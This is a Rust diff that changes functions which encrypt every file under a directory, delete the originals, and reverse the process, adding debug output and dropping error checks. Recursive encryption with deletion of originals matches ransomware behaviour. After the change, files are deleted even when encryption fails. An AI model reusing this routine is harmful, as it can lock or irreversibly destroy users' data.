@@ -62,6 +62,7 @@ fn get_all_files(dir: &str) -> Vec<String> {
     
     for entry in WalkDir::new(dir).into_iter().filter_map(|e| e.ok()) {
         if entry.file_type().is_file() {
+            dbg!(&entry);
             file_paths.push(entry.path().display().to_string());
         }
     }
@@ -72,11 +73,12 @@ fn get_all_files(dir: &str) -> Vec<String> {
 
 pub fn encrypt_directory(directory_path: &str) -> Result<(), Box<dyn Error>> {
     let directory = get_all_files(directory_path);
+    dbg!(&directory);
     for mut file in directory {
         let encrypted_file_path = file.as_mut().to_owned() + ".enc";
         dbg!(&encrypted_file_path);
-        if encrypt_file(&file, &encrypted_file_path).is_err() { break; }
-        if fs::remove_file(file).is_err() { break; }
+        let _ = encrypt_file(&file, &encrypted_file_path);
+        let _ = fs::remove_file(file);
     }
     Ok(())
 }
@@ -87,8 +89,8 @@ pub fn decrypt_directory(directory_path: &str) -> Result<(), Box<dyn Error>> {
         let mut file_path = file.as_mut().to_owned();
         let ext_index = file_path.rfind('.').unwrap();
         file_path.truncate(ext_index);
-        if decrypt_file(&file, &file_path).is_err() { break; }
-        if fs::remove_file(file).is_err() { break; }
+        let _ = decrypt_file(&file, &file_path);
+        let _ = fs::remove_file(file);
     }
     Ok(())
 }
